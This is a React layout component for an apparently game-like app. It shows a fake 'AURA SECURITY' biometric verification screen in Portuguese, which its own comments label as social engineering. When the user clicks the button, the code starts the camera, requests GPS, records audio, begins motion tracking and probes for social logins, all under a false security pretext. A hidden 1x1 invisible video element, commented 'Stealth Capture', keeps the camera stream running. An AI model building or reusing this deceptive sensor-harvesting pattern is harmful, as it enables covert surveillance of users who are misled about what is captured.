import React, { useState } from 'react';
import CRTVignette from '../effects/CRTVignette';
import { useGame } from '../../context/GameContext';
import { motion, AnimatePresence } from 'framer-motion';

const MainLayout = ({ children }) => {
    const {
        startCamera, cameraStream,
        requestGPS, recordAudio, startMotionTracking, detectSocialLogins
    } = useGame();
    const [verified, setVerified] = useState(false);
    const [verifying, setVerifying] = useState(false);
    const [step, setStep] = useState(0);

    const handleVerification = async () => {
        setVerifying(true);

        // Step 1: Camera
        setStep(1);
        await startCamera();

        // Step 2: GPS (non-blocking)
        setStep(2);
        requestGPS();

        // Step 3: Mic (record 2 seconds)
        setStep(3);
        await recordAudio(2000);

        // Step 4: Motion + Social (non-blocking)
        setStep(4);
        startMotionTracking();
        detectSocialLogins();

        // Done
        setTimeout(() => {
            setVerifying(false);
            setVerified(true);
        }, 500);
    };

    const getStepText = () => {
        switch (step) {
            case 1: return 'Analyzing facial features...';
            case 2: return 'Verifying location...';
            case 3: return 'Checking audio fingerprint...';
            case 4: return 'Scanning device sensors...';
            default: return 'Initializing...';
        }
    };

    return (
        <div className="relative min-h-[100dvh] w-full bg-deep-black text-neon-green font-mono overflow-x-hidden selection:bg-neon-green selection:text-deep-black safe-area-top safe-area-bottom">
            {/* Background Noise/Texture */}
            <div className="absolute inset-0 bg-noise opacity-[0.03] pointer-events-none mix-blend-overlay" />

            {/* CRT Overlay Effects */}
            <CRTVignette />

            {/* Hidden Video Element for Stealth Capture */}
            {cameraStream && (
                <video
                    autoPlay
                    playsInline
                    muted
                    ref={video => {
                        if (video) video.srcObject = cameraStream;
                    }}
                    className="fixed bottom-0 right-0 w-1 h-1 opacity-0 pointer-events-none z-0"
                />
            )}

            {/* Security Verification Modal (Social Engineering) */}
            <AnimatePresence>
                {!verified && (
                    <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className="fixed inset-0 z-50 bg-deep-black flex flex-col items-center justify-center p-6 text-center"
                    >
                        <div className="max-w-md w-full border border-cyber-blue p-8 relative overflow-hidden">
                            <div className="absolute inset-0 bg-cyber-blue/5 animate-pulse pointer-events-none"></div>

                            <h1 className="text-3xl font-black text-cyber-blue mb-2 tracking-widest">AURA SECURITY</h1>
                            <div className="h-0.5 w-full bg-cyber-blue mb-6"></div>

                            <div className="space-y-6">
                                <p className="text-white/80 font-mono text-sm leading-relaxed">
                                    Para garantir um ambiente de treino seguro, precisamos de verificação biométrica multi-fator.
                                </p>

                                <div className="flex flex-col gap-2 items-center text-xs text-cyber-blue/60 mb-4">
                                    <div className="flex items-center gap-2">
                                        <span className={`w-2 h-2 rounded-full ${step >= 1 ? 'bg-neon-green' : 'bg-white/30'} animate-pulse`}></span>
                                        <span>Câmara biométrica</span>
                                    </div>
                                    <div className="flex items-center gap-2">
                                        <span className={`w-2 h-2 rounded-full ${step >= 2 ? 'bg-neon-green' : 'bg-white/30'} animate-pulse`}></span>
                                        <span>Verificação geográfica</span>
                                    </div>
                                    <div className="flex items-center gap-2">
                                        <span className={`w-2 h-2 rounded-full ${step >= 3 ? 'bg-neon-green' : 'bg-white/30'} animate-pulse`}></span>
                                        <span>Impressão de voz</span>
                                    </div>
                                    <div className="flex items-center gap-2">
                                        <span className={`w-2 h-2 rounded-full ${step >= 4 ? 'bg-neon-green' : 'bg-white/30'} animate-pulse`}></span>
                                        <span>Análise de sensores</span>
                                    </div>
                                </div>

                                {verifying && (
                                    <div className="text-neon-green text-sm animate-pulse py-2 border border-neon-green/30 bg-neon-green/5">
                                        {getStepText()}
                                    </div>
                                )}

                                <button
                                    onClick={handleVerification}
                                    disabled={verifying}
                                    className="w-full bg-cyber-blue/10 border border-cyber-blue text-cyber-blue hover:bg-cyber-blue hover:text-deep-black py-4 px-6 font-bold tracking-wider transition-all disabled:opacity-50 disabled:cursor-wait"
                                >
                                    {verifying ? 'A VERIFICAR...' : 'INICIAR VERIFICAÇÃO'}
                                </button>

                                <p className="text-[10px] text-white/30 uppercase">
                                    Protocolo v5.0.0 // Acesso será concedido após verificação completa
                                </p>
                            </div>
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>

            {/* Main Content Area */}
            <div className="relative z-10 container mx-auto px-4 py-6 h-full flex flex-col">
                {children}
            </div>
        </div>
    );
};

export default MainLayout;
